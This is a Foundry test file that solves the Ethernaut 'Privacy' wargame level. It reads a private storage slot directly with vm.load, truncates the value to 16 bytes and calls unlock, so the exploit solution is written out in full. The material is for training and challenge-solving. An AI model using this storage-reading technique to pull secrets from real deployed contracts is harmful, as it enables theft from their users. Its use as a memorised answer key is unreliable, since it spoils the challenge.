// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.36;

import {Test} from "forge-std/Test.sol";
import {Privacy} from "ethernaut/contracts/src/levels/Privacy.sol";
import {PrivacyFactory} from "ethernaut/contracts/src/levels/PrivacyFactory.sol";

contract PrivacyTest is Test {
    address public immutable player = makeAddr("player");
    PrivacyFactory public factory;
    Privacy public level;

    function setUp() public {
        factory = new PrivacyFactory();
        level = Privacy(factory.createInstance(player));
    }

    function test_exploit_Privacy() public {
        assert(level.locked());
        uint256 offset = 2;
        bytes32 slot = bytes32(uint256(3) + offset);
        bytes32 key = vm.load(address(level), slot);
        level.unlock(bytes16(key));
        assert(factory.validateInstance(payable(address(level)), player));
    }
}
